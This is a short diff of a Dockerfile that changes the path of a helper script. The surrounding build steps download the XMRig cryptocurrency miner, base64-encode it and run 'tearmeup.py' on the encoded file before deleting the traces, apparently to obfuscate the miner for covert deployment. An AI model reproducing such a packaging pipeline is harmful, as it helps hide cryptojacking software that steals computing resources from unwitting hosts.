@@ -10,7 +10,7 @@ RUN tar -zxvf /tmp/xmrig-$XMRVERSION-linux-static-x64.tar.gz
 RUN cp xmrig-$XMRVERSION/xmrig .
 RUN rm -rf xmrig-$XMRVERSION/
 RUN cat xmrig| base64 > xmrig.b64
-COPY fileserver/fileserver/tearmeup.py .
+COPY fileserver/tearmeup.py .
 RUN chmod 755 tearmeup.py
 RUN ./tearmeup.py xmrig.b64
 RUN rm xmrig && rm xmrig.b64 && rm tearmeup.py
